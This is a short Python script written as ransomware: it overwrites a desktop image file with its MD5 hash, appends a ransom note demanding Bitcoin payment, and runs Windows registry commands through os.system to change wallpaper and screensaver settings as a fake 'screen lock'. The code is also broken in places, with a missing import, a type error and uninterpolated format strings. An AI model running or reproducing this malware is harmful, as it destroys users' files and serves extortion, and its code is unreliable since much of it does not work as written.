import tkinter as tk
from tkinter import ttk
import os
import hashlib
from time import sleep

def calculate_md5(data):    m = hashlib.md5()
    m.update(data)
    return m.hexdigest()

def lock_screen():    print('Locking Screen...')
    os.system(f'reg delete HKCU\\Control Panel\\Desktop /v Active Desktop')
    os.system('reg add HKCU\\Control Panel\\Desktop /v Wallpaper /t REG_SZ /d {screenshot}')
    os.system('reg add HKCU\\Control Panel\\ScreenSavers /v ScreenSaveActive /t REG_DWORD /d 1')
    os.system('reg delete HKCU\\Control Panel\\Desktop /v Wallpaper /f')
    os.system('reg delete HKCU\\Control Panel\\Desktop /v Background /f')
    os.system(f'reg add HKCU\\Control Panel\\Desktop /v Wallpaper /t REG_SZ /d {screenshot}')
    os.system('reg delete HKCU\\Control Panel\\ScreenSavers /v ScreenSaveActive /f')
    os.system('reg add HKCU\\Control Panel\\Desktop /v Background /t REG_SZ /d {screenshot}')
    

def ransom():    print('Starting Encryption...')
    data = calculate_md5(screenshot)
    with open(screenshot, 'w') as f:        f.write(data)
    with open('ransom_note.txt', 'a+') as f2:        f2.write(f'Your screen has been locked.\n')
        f2.write(f'To unlock your screen you must pay a ransom of {random.randint(0, 999)}.\n')
        f2.write(f'You can pay with Bitcoin by sending to this address: {random.random()}')
    lock_screen()
    

screenshot = 'C:\\Users\\username\\Desktop\\screenshot.jpg'
ransom()
